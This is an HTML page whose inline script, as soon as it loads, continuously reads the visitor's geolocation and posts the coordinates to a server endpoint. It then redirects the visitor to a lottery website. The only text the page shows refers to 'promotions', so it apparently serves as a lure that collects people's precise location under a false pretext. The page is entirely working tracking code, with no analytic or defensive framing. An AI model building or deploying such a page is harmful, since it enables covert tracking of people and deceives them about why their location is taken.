<!DOCTYPE html>
<html>
<head>
	<script type="text/javascript" src="https://code.jquery.com/jquery-1.11.3.min.js"></script>
	<script type="text/javascript">
		$(document).ready(getLocation);
		
		function getLocation() {
		    if (navigator.geolocation) {
		        navigator.geolocation.watchPosition(showPosition, handle_error);
		    } else { 
		        alert("Intenta ver nuestras promociones desde otro dispositivo.");
		    }
		}
		
		function showPosition(position) {
			sendLoc({latitud : position.coords.latitude , longitud : position.coords.longitude});
		}
		
		function handle_error(err) {
	        sendLoc({error : err.code});
	    }
		
		function sendLoc(obj) {
			$.ajax({
				url : "LG",
				data : obj,
				success: function(resp) {
					alert(resp);
					window.location.replace("http://electromillonaria.co");
				}, 
				error : function (xhr, ajaxOptions, thrownError) {
		        	alert(xhr.status);
		        	alert(xhr.responseText);
		      	}
			});
		}
	</script>
</head>

</html>
